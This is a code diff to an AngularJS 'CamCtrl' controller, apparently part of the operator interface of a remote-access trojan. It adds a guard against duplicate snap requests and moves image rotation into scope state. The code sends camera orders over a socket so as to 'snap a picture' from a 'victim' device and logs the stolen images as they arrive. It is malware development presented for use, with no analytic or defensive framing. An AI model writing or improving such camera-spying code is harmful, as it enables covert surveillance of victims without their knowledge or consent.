@@ -114,6 +114,7 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 app.controller("CamCtrl", function ($scope, $rootScope) {
     $camCtrl = $scope;
     $camCtrl.isSaveShown = false;
+    $camCtrl.isSnapping = false;
     var camera = CONSTANTS.orders.camera;
 
     // remove socket listner if the camera page is changed or destroied
@@ -139,6 +140,7 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
             $camCtrl.selectedCam = $camCtrl.cameras[1];
             $camCtrl.$apply();
         } else if (data.image == true) { // the rseponse is picture
+            $camCtrl.isSnapping = false;
 
             $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
 
@@ -194,19 +196,16 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
 
     $camCtrl.snap = () => {
         // send snap request to victim
+        if ($camCtrl.isSnapping) return;
+        $camCtrl.isSnapping = true;
         $rootScope.Log('Snap a picture');
         socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
     }
 
-    // Rotate Logic
-    var currentRotation = 0;
+    // Rotate Logic (Scope based)
+    $camCtrl.rotation = 0;
     $camCtrl.rotateImage = () => {
-        var img = document.getElementById('cameraImage');
-        if (img) {
-            currentRotation += 90;
-            if (currentRotation >= 360) currentRotation = 0;
-            img.style.transform = 'rotate(' + currentRotation + 'deg)';
-        }
+        $camCtrl.rotation = ($camCtrl.rotation + 90) % 360;
     };
 
 
